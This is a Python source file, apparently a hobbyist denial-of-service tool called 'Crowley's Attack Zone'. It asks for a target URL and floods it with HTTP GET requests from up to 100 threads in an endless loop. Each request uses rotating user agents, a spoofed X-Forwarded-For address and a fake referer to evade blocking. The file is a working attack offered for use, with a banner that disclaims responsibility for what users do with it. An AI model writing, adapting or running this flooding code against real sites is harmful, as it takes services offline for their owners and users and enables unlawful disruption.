import requests
import random
import time
import sys
import validators
import threading
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
from colorama import Fore, Style, init
import os

# Inicializar colorama
init(autoreset=True)

# ------------------- CONFIGURATION -------------------
MAX_THREADS = 100  # Maximum threads limit

# ------------------- RANDOM FUNCTIONS -------------------
def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100.0",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/97.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        # Added 10 more user agents
        "Mozilla/5.0 (Windows NT 5.1; rv:48.0) Gecko/20100101 Firefox/48.0",
        "Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
    ]
    return random.choice(agents)

def random_headers():
    return {
        "User-Agent": random_user_agent(),
        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
        "Referer": random.choice([
            "https://google.com", "https://duckduckgo.com", "https://bing.com"
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9"
        ])
    }

# ------------------- CONFIGURE URL -------------------
def get_target_url():
    while True:
        print(f"{Fore.MAGENTA}🚀 Let's start the attack! 🕹️")
        target_url = input(f"{Fore.CYAN}🔗 **Enter the target URL** (e.g., https://www.example.com): ").strip()
        
        # Validate if the URL is correct
        if validators.url(target_url):
            print(f"{Fore.GREEN}✅ Valid URL: {target_url}")
            return target_url
        else:
            print(f"{Fore.RED}❌ Oops! The URL is not valid. Make sure it starts with 'http://' or 'https://'.")
            print(f"{Fore.YELLOW}📢 Example of a valid URL: https://www.yoursite.com")
            continue  # Ask for the URL again if it's invalid

# ------------------- BANNER -------------------
def banner():
    print(f"""
{Fore.YELLOW}███████████████████████████████████████████████
{Fore.CYAN}💥 {Fore.MAGENTA}Crowley’s Attack Zone {Fore.GREEN}🧨
──────────────────────────────────────────────
{Fore.RED}(1) ⚡ Initiate DoS (URL)
{Fore.BLUE}(2) ⏹️ Exit
──────────────────────────────────────────────
{Fore.GREEN}📲 TikTok: croowleyy | IG: croowleey
──────────────────────────────────────────────
*DISCLAIMER: All DoS attacks are not my responsibility. 
Feel free to use my code, but I won't be held accountable for any actions you take.*
{Fore.YELLOW}███████████████████████████████████████████████
""")
    print(f"{Fore.CYAN}🔥 Welcome to the Crowley attack! 🔥")

# ------------------- MAIN FUNCTIONS -------------------
def attack_target(url):
    headers = random_headers()
    try:
        response = requests.get(url, headers=headers, timeout=10)
        print(f"{Fore.RED}🔴 Trying to attack {url}, status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}❌ Error while attacking {url}: {e}")

def attack_loop(stop_event):
    while not stop_event.is_set():
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            executor.map(attack_target, cycle([TARGET_URL]))

def stop_attack():
    input(f"{Fore.CYAN}Press ENTER to stop the attack.")
    stop_event.set()

def status_check():
    print(f"{Fore.RED}🚨 Attacking the target: {TARGET_URL}")

def main():
    banner()

    choice = input(f"{Fore.CYAN}Select an option (1/2): ")
    if choice == "1":
        global TARGET_URL
        TARGET_URL = get_target_url()  # Call the function to get a valid URL
        status_check()

        # Create a thread to stop the attack
        stop_thread = threading.Thread(target=stop_attack)
        stop_thread.daemon = True
        stop_thread.start()

        attack_loop(stop_event)

    elif choice == "2":
        print(f"{Fore.RED}👋 Goodbye! See you later.")
        sys.exit()

if __name__ == "__main__":
    TARGET_URL = ""
    stop_event = threading.Event()
    main()
